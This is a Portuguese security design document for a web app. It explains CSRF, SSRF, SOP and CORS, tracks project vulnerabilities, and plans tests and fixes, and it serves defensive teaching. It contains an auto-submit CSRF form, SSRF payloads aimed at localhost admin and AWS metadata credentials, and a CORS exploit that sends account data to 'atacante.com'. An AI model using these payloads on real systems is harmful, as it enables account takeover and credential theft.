# Segurança de Aplicações Web — CSRF, SSRF, SOP e CORS

> Baseado no curso "Proteção de Vulnerabilidades — Módulo 5: Combatendo CSRF e SSRF".
> Este documento descreve: os conceitos, as vulnerabilidades reais identificadas no projeto, os cenários de teste com resultado esperado (positivos e negativos), e o fluxo de implementação para o backend e o frontend.

---

## Conceitos do Curso

### Cross-Site Request Forgery (CSRF)

**CSRF** é um ataque que força o browser de um usuário autenticado a executar uma ação indesejada em uma aplicação onde ele está logado. O atacante não precisa roubar credenciais — ele explora a confiança que o servidor tem no browser da vítima.

**Como funciona:**
1. O usuário está autenticado na aplicação alvo (ex: vidalongaflix.com)
2. O atacante prepara uma página maliciosa com um formulário ou `fetch` que aponta para a aplicação alvo
3. O usuário acessa a página do atacante (via link por email, chat, redes sociais)
4. O browser da vítima envia automaticamente a requisição com os cookies de sessão da aplicação alvo
5. A aplicação processa a requisição como se fosse legítima

**Exemplo clássico de payload auto-submit:**
```html
<html>
  <body onload="document.getElementById('csrfForm').submit()">
    <form id="csrfForm" action="https://app.alvo.com/account/change-email" method="POST">
      <input type="hidden" name="email" value="atacante@exemplo.com" />
    </form>
  </body>
</html>
```
Quando a vítima abre essa página, o formulário é enviado automaticamente sem nenhuma interação. Se a aplicação não tiver proteção CSRF, o email da vítima é alterado.

**Por que o JWT Bearer token protege contra CSRF?**
O JWT é enviado via header `Authorization: Bearer {token}`, que precisa ser adicionado **explicitamente** pelo JavaScript. Um formulário HTML ou iframe malicioso não consegue incluir esse header — o browser nunca envia headers customizados automaticamente. Isso é diferente de cookies, que o browser envia em toda requisição para o domínio, independente da origem.

**Quando CSRF volta a ser um risco:**
Ao migrar para HttpOnly cookie (Sprint 7 do security-1.3), o token passa a ser enviado automaticamente pelo browser em toda requisição cross-origin. Nesse momento, é obrigatório habilitar proteção CSRF explícita.

---

### STP — Synchronizer Token Pattern

O servidor cria um token oculto único após o login e o incorpora nos formulários HTML como campo `hidden`. A cada requisição POST, o token é enviado junto e o servidor valida que é o mesmo token associado à sessão.

- Token gerado **uma vez por sessão** no mínimo
- Token gerado **a cada requisição** para operações de alto risco (transferências, troca de senha)
- A rotação do token a cada requisição é a mitigação mais robusta — tokens usados ou antigos são invalidados automaticamente
- Servidor cria, armazena e valida — 100% server-side
- Funciona bem em aplicações server-rendered (SSR, templates). Em SPAs com JWT Bearer, geralmente não é necessário.

---

### DBS — Double Submit Cookie

Abordagem client-side recomendada para aplicações **stateless** (como microsserviços e SPAs).

**Funcionamento:**
1. O servidor gera um token aleatório (`crypto.randomBytes(16)`) e o armazena em um cookie
2. O cliente lê o cookie e envia o mesmo valor no body ou header de cada requisição POST/PUT/DELETE
3. O servidor compara: `req.body.csrfToken === req.cookies.csrfToken`
4. Se não baterem → 403

**Ponto crítico:** o DBS depende do fato de que um site externo não consegue ler cookies de outro domínio (SOP). Porém, por ser client-side, pode ser vulnerável a técnicas mais elaboradas.

**Boas práticas ao implementar DBS:**
- Sempre criar uma assinatura separada atada à sessão do usuário — impede que tokens capturados antes da rotação sejam reutilizados
- Combinar com SameSite cookie para proteção em camadas
- Exige HTTPS para evitar MITM que poderia interceptar o cookie antes do Secure ser estabelecido

---

### Cookie SameSite — Recapitulação

`SameSite` controla quando o browser envia um cookie em requisições cross-site. É uma defesa complementar ao CSRF, não substituição do token CSRF em arquiteturas de cookie.

| Valor | Comportamento |
|---|---|
| `Strict` | Cookie enviado apenas em navegações same-origin. Máxima proteção CSRF. Pode quebrar redirects legítimos de links externos. |
| `Lax` | Cookie enviado em navegações top-level (clicar em link), mas não em sub-recursos (imagens, `fetch` de fundo). Padrão em browsers modernos. |
| `None` | Sem restrição cross-origin. Exige `Secure`. Requerido quando frontend e backend estão em eTLD+1 distintos (ex: `vidalongaflix.com` e `api.vidalongaflix.com.br`). Nesse cenário cross-domain é a única opção viável. |

> **Nota do projeto (21/06/2026):** O VidaLongaFlix usa `SameSite=None` nos cookies de sessão JWT porque o frontend (`vidalongaflix.com`) e o backend (`api.vidalongaflix.com.br`) pertencem a domínios de eTLD+1 diferentes — `.com` e `.com.br` são TLDs distintos na Public Suffix List. `Strict` ou `Lax` bloqueariam o cookie em toda requisição AJAX do Angular. `SameSite=None; Secure` é, portanto, obrigatório nessa arquitetura, não uma concessão de segurança. A proteção CSRF nesse cenário virá via CSRF token (Sprint CSRF-2 do roadmap).

**Limitação importante:** `SameSite` **não protege cookies armazenados no LocalStorage**. Se o token JWT estiver no LocalStorage, configurar SameSite não tem efeito nenhum sobre ele.

---

### Outras Técnicas de Prevenção CSRF

**Verificação de Origin e Referer:**
O servidor verifica os headers `Origin` e `Referer` de cada requisição. Se o valor não corresponde ao domínio esperado, a requisição é rejeitada.
- Complementar, mas não suficiente como única defesa
- Browsers modernos podem omitir `Referer` dependendo da `Referrer-Policy` configurada

**Custom Cookie / X-CSRF-Token:**
Implementação manual de um token randomizado:
```
X-CSRF-Token: RANDOM-TOKEN-VALUE
```
Útil quando frameworks não oferecem proteção nativa. Requer implementação cuidadosa e assinatura vinculada à sessão para evitar bypass.

---

### Server-Side Request Forgery (SSRF)

**SSRF** é uma vulnerabilidade que permite a um atacante forjar requisições executadas **pelo servidor**, não pelo browser. Diferente do CSRF, não requer interação do usuário — o atacante manipula diretamente um parâmetro da API.

**Mecanismo:**
1. A aplicação aceita uma URL como parâmetro de entrada (ex: `stockApi=http://...`)
2. O servidor busca esse recurso internamente
3. O atacante substitui a URL por um endereço interno (`localhost`, `169.254.169.254`, IPs privados)
4. O servidor, que tem acesso à rede interna, executa a requisição como se fosse legítima
5. O resultado pode ser: exfiltração de dados internos, acesso a painéis admin, reverse shell, derrubada de serviços

**Por que é perigoso:**
O servidor tem acesso a recursos que o browser da vítima não teria — rede interna, metadata de cloud, serviços sem autenticação em `localhost`.

**Exemplo de escalada:**
```
# Parâmetro original
stockApi=http://stock.interno:8080/check?id=1

# SSRF básico — acessar admin interno
stockApi=http://localhost/admin

# SSRF avançado — deletar usuário via painel interno
stockApi=http://localhost/admin/delete?username=carlos

# SSRF com path traversal
stockApi=http://localhost/../../../etc/passwd

# SSRF no AWS — metadata do EC2 (sem IMDSv2)
stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

### Mitigações de SSRF

**1. Allow list (lista de permissão):**
Validar que a URL fornecida aponta apenas para domínios explicitamente autorizados.

```java
private static final Set<String> ALLOWED_HOSTS = Set.of(
    "api.parceiro-autorizado.com",
    "cdn.vidalongaflix.com.br"
);

public void validateUrl(String url) {
    URI uri = URI.create(url);
    String host = uri.getHost();
    if (host == null || !ALLOWED_HOSTS.contains(host)) {
        throw new SecurityException("Host não autorizado: " + host);
    }
}
```

**2. Regex para validação de domínio:**
A allow list sozinha não é suficiente. Um regex mal implementado pode aceitar `pentest.oasp.org` como válido quando `owasp.org` está na lista. O regex deve validar toda a estrutura do hostname, incluindo subdomínios e sufixos.

Exemplo de regex vulnerável a bypass:
- Allow list: `owasp.org`
- Regex: `.*owasp\.org.*` → aceita `pentest-owasp.org` ou `pentest.arroba-owasp.org`

Regex correto:
```regex
^(([a-zA-Z]{1})([a-zA-Z]{1}[a-zA-Z]{1})|([a-zA-Z]{1}[0-9]{1})|([0-9]{1}[a-zA-Z]{1})|([a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]))\.(owasp\.org)$
```
O hostname inteiro deve ser validado, não apenas uma substring.

**3. Validação de protocolo:**
SSRF não ocorre apenas em HTTP/HTTPS. Protocolos como `file://`, `ftp://`, `gopher://` e `dict://` podem ser usados para acessar recursos internos diretamente pelo servidor.

```java
public void validateProtocol(String url) {
    URI uri = URI.create(url);
    String scheme = uri.getScheme();
    if (!Set.of("http", "https").contains(scheme.toLowerCase())) {
        throw new SecurityException("Protocolo não permitido: " + scheme);
    }
}
```

**4. Bloquear endereços internos:**
Mesmo com allow list, a resolução DNS pode retornar um IP interno. Após resolver o hostname, validar que o IP resultante não é privado.

```java
// Faixas a bloquear:
// 127.0.0.0/8       — loopback
// 10.0.0.0/8        — rede privada classe A
// 172.16.0.0/12     — rede privada classe B
// 192.168.0.0/16    — rede privada classe C
// 169.254.0.0/16    — link-local (AWS metadata endpoint)
// ::1               — IPv6 loopback
```

**5. AWS IMDSv2 — proteção na nuvem:**
A AWS Metadata Service (IMDS) em `http://169.254.169.254` expõe informações da instância EC2, incluindo credenciais IAM temporárias. Um SSRF que acessa esse endpoint pode roubar credenciais com permissões amplas.

O **IMDSv2** requer um token temporário obtido via requisição PUT antes de acessar os metadados, tornando o acesso via SSRF simples inviável. Habilitar IMDSv2 no console EC2 (ou via EB environment) é obrigatório.

**6. Logs e Threat Intelligence:**
Logs não são uma defesa ativa, mas são essenciais para detecção. Requisições suspeitas (hostname incomum, IPs internos, protocolos alternativos) devem gerar alertas no Loki/Grafana que acionam War Room para resposta a incidentes.

---

### SOP — Same Origin Policy

**SOP** é um mecanismo do lado do cliente que impede que JavaScript de um site leia conteúdo de outro. Funciona como um isolamento automático no browser: scripts de `evil.com` não podem ler cookies, headers ou respostas de `vidalongaflix.com`.

**A SOP age sobre:**
- Acesso via JavaScript a respostas HTTP de outra origem
- Leitura de cookies de outro domínio
- Acesso via `window.opener` entre origens diferentes

**Origem** é definida pelos três elementos: esquema (https) + domínio (vidalongaflix.com) + porta (443). Qualquer diferença entre dois desses elementos constitui origens distintas.

---

### CORS — Cross-Origin Resource Sharing

**CORS** é o mecanismo que permite relaxar a SOP de forma controlada. Quando o frontend Angular (em `vidalongaflix.com`) precisa chamar a API Spring Boot (em `api.vidalongaflix.com.br`), são origens diferentes — o CORS define quais delas são autorizadas.

**Cabeçalhos CORS principais:**

| Header | Papel |
|---|---|
| `Access-Control-Allow-Origin` | Quais origens têm acesso |
| `Access-Control-Allow-Methods` | Quais métodos HTTP são permitidos |
| `Access-Control-Allow-Headers` | Quais headers podem ser enviados |
| `Access-Control-Allow-Credentials` | Se cookies/credenciais podem ser compartilhados |

**Simple Requests vs Pre-Flight:**
- **Simple Requests** (GET, POST simples sem headers de autenticação): o browser envia direto, sem verificação prévia
- **Pre-Flight Requests** (PUT, DELETE, ou POST com `Authorization`, `Content-Type: application/json`): o browser envia primeiro um `OPTIONS` para verificar se a operação é permitida. Só envia a requisição real se o servidor responder com os headers CORS corretos.

**Misconfigurations críticas:**

| Configuração | Risco |
|---|---|
| `Access-Control-Allow-Origin: *` | Qualquer site pode ler as respostas da API — exfiltração de dados |
| `Access-Control-Allow-Origin: null` | Browsers interpretam como `true` — permite acesso de páginas locais e sandboxed |
| Refletir a origem recebida sem validação | O servidor aceita qualquer domínio como origem válida |
| `allowedHeaders("*")` com credenciais | Qualquer header pode ser compartilhado, incluindo tokens de autorização |

**Exploração de CORS misconfiguration (exemplo do curso):**
```javascript
// Servidor misconfigured reflete qualquer Origin
// Atacante usa isso para extrair a API Key do admin

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        // Envia a resposta (com API key) para servidor do atacante
        fetch('https://atacante.com/capture?data=' + xhr.responseText);
    }
};
xhr.open('GET', 'https://app.alvo.com/my-account', true);
xhr.withCredentials = true;  // envia cookies junto
xhr.send();
```

---

## Vulnerabilidades Reais Identificadas no Projeto

| # | Arquivo | Linha | Problema | Tipo de risco | Status |
|---|---|---|---|---|---|
| V1 | `SecurityConfig.java` | 37 | `csrf.disable()` — correto para JWT Bearer stateless. **Migração para cookie iniciada em 21/06/2026**: login/register/logout agora setam httpOnly cookie. CSRF protection deve ser habilitado na próxima fase (Sprint CSRF-2) | CSRF ativo — cookie está sendo enviado pelo browser em todas as requisições | ⚠️ Em andamento — cookie em produção, CSRF token pendente |
| V2 | `CorsConfig.java` | 19 | ~~`allowedHeaders("*")`~~ — **corrigido**: substituído por lista explícita (`Authorization`, `Content-Type`, `Accept`, `X-Requested-With`) | ~~Exfiltração de headers sensíveis via CORS misconfiguration~~ | ✅ Resolvido (21/06/2026) |
| V3 | `SecurityConfig.java` | — | `headers.disable()` (já identificado em security-1.4) — remove `Vary: Origin` do CORS, que pode causar cache poisoning cross-origin | Cache poisoning + CORS bypass via CDN | 🔴 Aberto |
| V4 | `SecurityConfig.java` | 46-47 | `/actuator/health` e `/actuator/info` são públicos; demais endpoints exigem `ROLE_ADMIN`. **Parcialmente resolvido**: as linhas corretas já estão no `SecurityConfig` atual | SSRF interno via Actuator + fingerprinting | ✅ Resolvido |
| V5 | `WhatsAppService.java` | 49 | `String url = "https://graph.facebook.com/" + apiVersion + "/" + phoneNumberId + "/messages"` — URL construída com variáveis de configuração, **não com input do usuário**. Positivo. | ✅ URL não é controlada pelo usuário — sem vetor SSRF direto | ✅ N/A |
| V6 | `WhatsAppService.java` | 63 | `new RestTemplate()` criado por chamada — sem connection timeout, sem pool de conexões, sem limites | DoS por thread blocking em falha da API do WhatsApp | 🔴 Aberto |
| V7 | `CorsConfig.java` | 21 | `allowCredentials(true)` — obrigatório agora que o frontend usa `withCredentials: true` com cookies. Com `allowedOrigins` restrito via env var, é seguro. Nenhum endpoint público combina `allowCredentials(true)` com wildcard origin | Aceitável com a configuração atual | ✅ Aceitável |
| V8 | (futuro) | — | Se qualquer endpoint vier a aceitar uma URL como parâmetro de input do usuário (ex: thumbnail URL para import, webhook URL para notificações), SSRF passa a ser um vetor real | SSRF — preparar `SsrfProtectionService` antes de qualquer feature de URL-fetch | ⏳ Preventivo |

---

## Cenários de Teste e Resultado Esperado

### Backend — CSRF

---

#### Cenário B1 — JWT Bearer como proteção CSRF implícita

**Contexto:** Com a arquitetura atual (JWT no header `Authorization: Bearer`), CSRF não é um vetor ativo porque headers customizados não são enviados automaticamente pelo browser.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo | POST `/videos` com header `Authorization: Bearer {token}` válido | HTTP 200 — requisição processada normalmente |
| ✅ Positivo | POST `/videos` via formulário HTML externo (sem header Authorization) | HTTP 401 — sem o header Bearer, o Spring Security rejeita |
| ✅ Positivo | Payload de CSRF gerado pelo Burp Suite aponta para a API com `method="POST"` | HTTP 401 — formulário HTML não consegue incluir o header `Authorization` |
| ❌ Negativo | POST `/auth/login` com `Content-Type: application/x-www-form-urlencoded` via form externo | HTTP 400 ou 401 — endpoint espera JSON, não form-encoded |
| ⚠️ Atenção | Migração para HttpOnly cookie (security-1.3 Sprint 7) sem habilitar CSRF protection | Toda a proteção CSRF atual deixa de existir — CSRF passa a ser vetor real |

---

#### Cenário B2 — Proteção CSRF ao migrar para HttpOnly Cookie (Fase 2)

**Contexto:** Quando a migração para cookies for feita, o Spring Security CSRF deve ser reabilitado com `CookieCsrfTokenRepository` (implementação do DBS).

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo | POST com cookie de sessão + header `X-XSRF-TOKEN` com valor correto do cookie | HTTP 200 — DBS valida e processa |
| ❌ Negativo | POST com cookie de sessão mas sem header `X-XSRF-TOKEN` | HTTP 403 — CSRF token ausente |
| ❌ Negativo | POST com `X-XSRF-TOKEN` com valor adulterado | HTTP 403 — token não bate com o cookie |
| ❌ Negativo | Payload de CSRF externo envia o cookie mas não o header X-XSRF-TOKEN | HTTP 403 — site externo não consegue ler o cookie para incluir no header |

---

### Backend — CORS

---

#### Cenário B3 — Origens permitidas explícitas

**Contexto:** O `CorsConfig.java` lê `CORS_ALLOWED_ORIGINS` da env var. Em produção: `https://vidalongaflix.com,https://www.vidalongaflix.com,https://d2efnb2x9r22my.cloudfront.net`.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo | Requisição com `Origin: https://vidalongaflix.com` | Resposta contém `Access-Control-Allow-Origin: https://vidalongaflix.com` |
| ✅ Positivo | Requisição com `Origin: https://d2efnb2x9r22my.cloudfront.net` | Resposta contém `Access-Control-Allow-Origin: https://d2efnb2x9r22my.cloudfront.net` |
| ❌ Negativo | Requisição com `Origin: https://evil.com` | Resposta **não contém** `Access-Control-Allow-Origin` — browser bloqueia a leitura |
| ❌ Negativo | Requisição com `Origin: null` (iframe sandboxed) | Resposta não contém header CORS — acesso negado |
| ❌ Negativo | Tentativa de acessar `/my-account` com credenciais via `Origin: https://evil.com` | CORS bloqueia — JavaScript do atacante não consegue ler a resposta |

---

#### Cenário B4 — Pre-flight request

**Contexto:** O Angular envia `Content-Type: application/json` e `Authorization: Bearer` — isso aciona Pre-Flight. O backend deve responder corretamente ao `OPTIONS`.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo | `OPTIONS /videos` com `Origin: https://vidalongaflix.com` e `Access-Control-Request-Method: PUT` | HTTP 204 com `Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH` |
| ✅ Positivo | `OPTIONS` seguido do `PUT` real com token | PUT processado normalmente após pré-verificação |
| ❌ Negativo | `OPTIONS /admin/videos` com `Origin: https://evil.com` | Resposta sem `Access-Control-Allow-Origin` — browser cancela a requisição real |
| ❌ Negativo | `OPTIONS` com `Access-Control-Request-Headers: X-Custom-Attack-Header` | Header não está na allow list → browser bloqueia a requisição real |

---

#### Cenário B5 — Headers CORS explícitos (problema atual V2)

**Contexto:** `allowedHeaders("*")` aceita qualquer header. Deve ser substituído por lista explícita.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo (após correção) | Requisição com `Authorization` e `Content-Type` | Aceitos — estão na lista explícita |
| ✅ Positivo (após correção) | Requisição com `X-Request-ID` (se adicionado à lista) | Aceito |
| ❌ Negativo (após correção) | Requisição com `X-Custom-Exfiltration-Header` | Não está na lista — browser bloqueia |
| ❌ Negativo (antes da correção) | Qualquer header customizado de origem permitida | Aceito — `*` permite qualquer header |

---

#### Cenário B6 — Actuator sem autenticação (problema atual V4)

**Contexto:** `/actuator/**` está com `permitAll()`. Endpoints de info e mappings são vetores de fingerprinting e SSRF interno.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo (após correção) | GET `/actuator/health` sem autenticação | HTTP 200 — health check público é aceitável |
| ❌ Negativo (situação atual) | GET `/actuator/env` sem autenticação | HTTP 200 com variáveis de ambiente — **exposição crítica** |
| ❌ Negativo (situação atual) | GET `/actuator/mappings` sem autenticação | HTTP 200 com todos os endpoints mapeados — fingerprinting completo |
| ❌ Negativo (situação atual) | GET `/actuator/beans` sem autenticação | HTTP 200 com todos os beans Spring — arquitetura interna exposta |
| ✅ Positivo (após correção) | GET `/actuator/env` sem token de ROLE_ADMIN | HTTP 401 ou 403 — apenas admin pode ver variáveis de ambiente |

---

### Backend — SSRF

---

#### Cenário B7 — WhatsApp Service não é SSRF (positivo)

**Contexto:** `WhatsAppService.java` constrói a URL a partir de configurações da aplicação, não de input do usuário.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo | Envio de notificação WhatsApp para número de cadastro | Requisição vai para `https://graph.facebook.com/` — URL hardcoded, não manipulável |
| ✅ Positivo | Usuário não controla nenhum fragmento da URL do WhatsApp | Código-fonte confirma: `phoneNumberId` e `apiVersion` vêm apenas de `@Value` + application.properties |

---

#### Cenário B8 — SSRF em features futuras de URL-fetch

**Contexto:** Qualquer endpoint futuro que aceite URL como parâmetro (webhook URL, thumbnail URL externa, feed de conteúdo externo) deve ter `SsrfProtectionService` na entrada.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo | URL `https://cdn.vidalongaflix.com.br/thumbnail.jpg` | Na allow list — busca permitida |
| ❌ Negativo | URL `http://localhost/admin/delete?username=carlos` | Host `localhost` na blocklist — rejeitado com 400 |
| ❌ Negativo | URL `http://169.254.169.254/latest/meta-data/` | IP link-local (AWS metadata) bloqueado — 400 |
| ❌ Negativo | URL `http://10.0.0.1/internal-service` | IP privado (10.x.x.x) bloqueado — 400 |
| ❌ Negativo | URL `file:///etc/passwd` | Protocolo `file://` não na lista de protocolos permitidos — 400 |
| ❌ Negativo | URL `https://pentest.vidalongaflix.com.br` (não na allow list) | Host não autorizado — 400 mesmo que pareça legítimo |
| ❌ Negativo | URL que resolve DNS para IP privado (`http://ssrf.atacante.com` → 10.0.0.1) | Após resolução DNS, IP é verificado — bloqueado |

---

### Frontend Angular — CORS e CSRF

---

#### Cenário F1 — Interceptor envia `withCredentials: true` apenas para a API própria

**Contexto (atualizado 21/06/2026):** Com a migração para httpOnly cookie, o `auth.interceptor.ts` não lê mais token do storage. Agora adiciona apenas `withCredentials: true` em chamadas para a API própria, para que o browser inclua o cookie httpOnly automaticamente. Chamadas externas (CDN, Google, etc.) não recebem `withCredentials`.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo | Requisição para `https://api.vidalongaflix.com.br/api/videos` | `withCredentials: true` — browser envia o cookie httpOnly automaticamente |
| ✅ Positivo | Requisição para `https://fonts.googleapis.com` | `withCredentials` **ausente** — cookie não é enviado para terceiros |
| ✅ Positivo | Header `Authorization` ausente em todas as requisições | Nenhum token legado do localStorage é enviado para nenhuma origem |
| ❌ Negativo | Formulário HTML externo tenta replicar requisição POST com o cookie | SameSite=None + CORS allowedOrigins restrito bloqueiam a leitura da resposta — mitigado, mas exige CSRF token como próxima camada |

---

#### Cenário F2 — Pre-flight e CORS no Angular (comportamento do browser)

**Contexto:** O Angular usa `HttpClient` com `Content-Type: application/json` e `Authorization: Bearer`, o que aciona pré-verificação CORS automaticamente.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo | POST com JSON body e token JWT | Browser envia OPTIONS primeiro → servidor responde com CORS headers → POST real processado |
| ✅ Positivo | OPTIONS sem body recebe 204 com CORS headers corretos | Sem erro de CORS no console do browser |
| ❌ Negativo | Servidor não responde ao OPTIONS ou responde com 404 | Browser cancela a requisição real — erro CORS no console: "has been blocked by CORS policy" |
| ❌ Negativo | CORS headers ausentes na resposta do servidor | Mesmo que a API processe a requisição, o browser bloqueia que o Angular leia a resposta |

---

#### Cenário F3 — `withCredentials: true` restrito à API própria (cookie httpOnly)

**Contexto (atualizado 21/06/2026):** Com a migração para httpOnly cookie, `withCredentials: true` é agora **obrigatório** nas chamadas para a API. O interceptor Angular o adiciona condicionalmente — somente para URLs que começam com `environment.apiUrl`, nunca para terceiros.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo | `HttpClient` para a API com `withCredentials: true` | Cookie httpOnly é enviado — autenticação funciona sem token no storage |
| ✅ Positivo | `HttpClient` para URL externa sem `withCredentials` | Cookie não é enviado para terceiros — sem vazamento de sessão |
| ❌ Negativo | `withCredentials: true` ausente na chamada para a API | Browser não inclui o cookie — 401 em todas as requisições autenticadas |
| ❌ Negativo | `withCredentials: true` habilitado globalmente (sem filtro de URL) | Cookie seria enviado para CDNs e analytics se eles estiverem no mesmo domínio |

---

#### Cenário F4 — CORS na origem do Angular (proteção SOP)

**Contexto:** A SOP do browser já impede que scripts do Angular lendo respostas de APIs de outras origens sem CORS. Validar que o Angular não faz `fetch` para URLs não autorizadas.

| Tipo | Situação | Resultado Esperado |
|---|---|---|
| ✅ Positivo | Todos os `HttpClient.get/post/put/delete` apontam para `environment.apiUrl` | Requisições vão para origem esperada — CORS configurado para essa origem |
| ❌ Negativo | Qualquer `HttpClient` chamada para URL hardcoded externa diferente da API | Erro CORS ou vazamento de token via interceptor sem filtro |
| ❌ Negativo | Token JWT lido por JavaScript de outra aba ou origem via `window.opener` | SOP bloqueia — `Cross-Origin-Opener-Policy: same-origin` (header a ativar no security-1.4 Sprint 1) reforça |

---

## Fluxo de Implementação — Como Colocar os Conceitos em Prática

---

### O ciclo para cada vulnerabilidade

```
1. Escolher o cenário deste documento
2. Criar o spec com o comportamento esperado
3. Rodar → FALHAR (Red) — confirma que o problema existe
4. Fazer a correção mínima no código
5. Rodar → PASSAR (Green)
6. Verificar manualmente o fluxo normal
7. Passar para o próximo cenário
```

---

### Preparação — Antes de começar

**Backend:** confirmar que `./mvnw test` passa. Os specs de CSRF e CORS serão em `src/test/java/.../security/`.

**Frontend:** confirmar que `npm test -- --watch=false` passa. Specs do interceptor em `auth.interceptor.spec.ts`.

---

### Sprint 1 — Restringir `allowedHeaders` no CORS (Problema V2)

**Objetivo:** Substituir `allowedHeaders("*")` por uma lista explícita dos headers necessários para a API.

**Passo a passo:**

1. Criar `CorsConfigTest.java` — verificar que um header customizado inesperado é rejeitado na pré-verificação
2. Rodar e confirmar que o teste falha com `allowedHeaders("*")` (Red)
3. Abrir `CorsConfig.java` e substituir `.allowedHeaders("*")` por lista explícita:
   ```java
   .allowedHeaders(
       "Authorization",
       "Content-Type",
       "Accept",
       "X-Requested-With",
       "Origin",
       "Access-Control-Request-Method",
       "Access-Control-Request-Headers"
   )
   ```
4. Rodar os specs e confirmar verde
5. Testar manualmente que o Angular ainda funciona (login, listagem de vídeos, comentários)
6. Confirmar que o header `OPTIONS` de pré-verificação retorna a lista explícita

**Critério de conclusão:** spec verde + Angular funcional + headers explícitos no OPTIONS.

---

### Sprint 2 — Restringir `/actuator/**` ao ROLE_ADMIN (Problema V4)

**Objetivo:** `/actuator/health` continua público. Todos os outros endpoints do actuator exigem autenticação com ROLE_ADMIN.

**Passo a passo:**

1. Criar `ActuatorSecurityTest.java` — verificar que `/actuator/env` retorna 401 sem token e 403 com token de ROLE_USER
2. Rodar e confirmar Red (atualmente `permitAll()` aceita qualquer requisição)
3. Abrir `SecurityConfig.java` e substituir:
   ```java
   // Antes
   .requestMatchers("/actuator/**").permitAll()

   // Depois
   .requestMatchers("/actuator/health", "/actuator/health/**").permitAll()
   .requestMatchers("/actuator/**").hasRole("ADMIN")
   ```
4. Rodar os specs e confirmar verde
5. Testar em ambiente local: `curl /actuator/health` → 200; `curl /actuator/env` → 401; `curl /actuator/env -H "Authorization: Bearer {admin_token}"` → 200
6. Confirmar que o CI continua funcionando (o health check do EB usa `/actuator/health`)

**Critério de conclusão:** spec verde + health check público + demais endpoints exigem ADMIN.

---

### Sprint 3 — Configurar RestTemplate do WhatsApp com timeout e pool (Problema V6)

**Objetivo:** O `WhatsAppService` cria um `RestTemplate` novo a cada chamada, sem timeout. Em caso de falha na API do WhatsApp, a thread fica bloqueada indefinidamente.

**Passo a passo:**

1. Criar `WhatsAppServiceTest.java` — mock do `RestTemplate`, verificar que o bean é injetado (não criado por chamada)
2. Abrir `WhatsAppService.java` e:
   - Extrair o `RestTemplate` como `@Bean` em `InfraConfig.java` com timeout de 5s (connect) e 10s (read):
     ```java
     @Bean
     public RestTemplate whatsAppRestTemplate() {
         HttpComponentsClientHttpRequestFactory factory =
             new HttpComponentsClientHttpRequestFactory();
         factory.setConnectTimeout(5000);
         factory.setReadTimeout(10000);
         return new RestTemplate(factory);
     }
     ```
   - Injetar via construtor em `WhatsAppService`
3. Rodar os specs e confirmar verde
4. Testar com URL inválida de WhatsApp e confirmar que após 10s a thread é liberada com erro

**Critério de conclusão:** spec verde + timeout configurado + RestTemplate injetado, não instanciado por chamada.

---

### Sprint 4 — Criar `SsrfProtectionService` preventivo (Problema V8)

**Objetivo:** Antes que qualquer feature de URL-fetch seja implementada, criar o serviço de proteção para que o padrão correto já esteja disponível.

**Passo a passo:**

1. Criar `SsrfProtectionServiceTest.java` com os casos do Cenário B8
2. Criar `SsrfProtectionService.java` em `infra/security/`:
   ```java
   @Service
   public class SsrfProtectionService {

       private static final Set<String> ALLOWED_PROTOCOLS = Set.of("http", "https");

       // Faixas de IP privado (CIDR simplificado)
       private static final List<String> BLOCKED_PREFIXES = List.of(
           "127.", "10.", "192.168.", "169.254.",  // IPv4
           "172.16.", "172.17.", "172.18.", "172.19.",
           "172.20.", "172.21.", "172.22.", "172.23.",
           "172.24.", "172.25.", "172.26.", "172.27.",
           "172.28.", "172.29.", "172.30.", "172.31."
       );

       public void validate(String rawUrl, Set<String> allowedHosts) {
           URI uri;
           try {
               uri = URI.create(rawUrl);
           } catch (IllegalArgumentException e) {
               throw new SecurityException("URL inválida");
           }

           // 1. Protocolo
           if (!ALLOWED_PROTOCOLS.contains(uri.getScheme().toLowerCase())) {
               throw new SecurityException("Protocolo não permitido: " + uri.getScheme());
           }

           // 2. Allow list de hosts
           String host = uri.getHost();
           if (host == null || !allowedHosts.contains(host)) {
               throw new SecurityException("Host não autorizado: " + host);
           }

           // 3. Resolução de DNS — bloquear IPs privados
           try {
               InetAddress[] addresses = InetAddress.getAllByName(host);
               for (InetAddress address : addresses) {
                   String ip = address.getHostAddress();
                   if (isPrivateIp(ip)) {
                       throw new SecurityException("IP privado detectado após resolução DNS: " + ip);
                   }
               }
           } catch (UnknownHostException e) {
               throw new SecurityException("Host não resolúvel: " + host);
           }
       }

       private boolean isPrivateIp(String ip) {
           return ip.equals("127.0.0.1") || ip.equals("::1") ||
               BLOCKED_PREFIXES.stream().anyMatch(ip::startsWith);
       }
   }
   ```
3. Rodar os specs do `SsrfProtectionServiceTest` e confirmar verde
4. Documentar que **todo** novo endpoint que aceitar URL como input deve chamar `ssrfProtectionService.validate()` antes de executar qualquer requisição HTTP

**Critério de conclusão:** spec verde + serviço criado e documentado como padrão obrigatório.

---

### Sprint 5 — Documentar a proteção CSRF para migração para cookies (Fase 2)

**Objetivo:** Criar os specs que vão falhar quando a migração para HttpOnly cookie (security-1.3 Sprint 7) for executada. Eles documentam exatamente o que precisa ser feito.

**Passo a passo:**

1. Criar `CsrfCookieMigrationTest.java` com os casos do Cenário B2:
   - Caso que verifica: POST sem `X-XSRF-TOKEN` retorna 403 (vai **falhar agora** — isso é esperado)
   - Caso que verifica: resposta do login contém `Set-Cookie` com `XSRF-TOKEN` e `HttpOnly=false` (para que o Angular possa ler)
2. Marcar os specs com `@Disabled("CSRF protection - habilitar quando migrar para HttpOnly cookie (security-1.3 Sprint 7)")`
3. Listar os arquivos que precisam mudar na migração:
